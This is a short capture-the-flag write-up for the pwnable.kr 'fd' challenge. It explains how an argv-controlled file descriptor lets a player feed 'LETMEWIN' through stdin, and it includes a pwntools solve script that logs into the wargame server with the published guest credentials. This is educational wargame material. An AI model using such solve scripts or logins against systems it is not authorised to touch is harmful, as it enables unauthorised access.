# PWNABLE.KR - FD

 ### Bug overview
 ---
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char buf[32];

int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234; /* BUG */
	int len = 0;

    /* fd here is gonna be 0(input), which takes input and we can bypass the if check by inputing LETMEWIN string */
	len = read(fd, buf, 32);

	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}    
```

> If we look carefully, we can see a bug which gives us the ability to pick which file descriptor we would like to use. We need to use the correct value in `argv[1]` which is **4660** in order to use **FD 0(input)**, and then, when `read(0, buf, 32)` gonna be invoked we can input `LETMEWIN` string and bypass the if check block, then we can dump the flag. 

## Exploit 
---- 
```python

from pwn import *

server = ssh(user='fd', host='pwnable.kr', port=2222, password='guest')

def main():
    p = server.process(['./fd', '4660'])
        
    p.sendline('LETMEWIN')

    p.interactive()

if __name__ == '__main__':
    main()


```

